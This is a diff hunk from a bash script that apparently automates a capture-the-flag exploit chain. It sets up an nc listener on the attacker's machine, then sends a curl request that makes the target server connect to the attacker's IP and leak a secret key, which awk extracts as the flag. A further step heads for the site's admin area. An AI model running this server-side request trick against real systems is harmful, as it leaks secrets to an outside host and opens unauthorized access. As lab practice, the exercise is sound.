@@ -18,11 +18,11 @@ curl -s -X GET "http://$target_ip:8087" -L > /dev/null
 # Tweak the server into downloading resume from our attack box
 echo "2 - RETRIEVING SECRET KEY"
 rm /work/10-nc-log.txt
-sudo mate-terminal -- bash -c "nc -lvnp 8087 | tee /work/10-nc-log.txt; exec bash" &
+sudo mate-terminal -- bash -c "nc -lvnp 8087 | tee /work/10-nc-log.txt; exec bash" > /dev/null &
 sleep 3
 curl -s -X GET "http://$target_ip:8087/download?server=$attack_ip:8087&id=75482342" &
 sleep 1
-echo "--> Flag is : $(awk 'BEGIN { FS=":" } NR % 5 == 0 { print NR,$1,$2,$3}' /work/10-nc-log.txt)"
+echo "--> Flag is : $(awk 'BEGIN { FS=":" } NR % 5 == 0 { print $2 }' /work/10-nc-log.txt)"
 
 # Access site admin area
 echo "3 - ACCESSING ADMIN AREA"
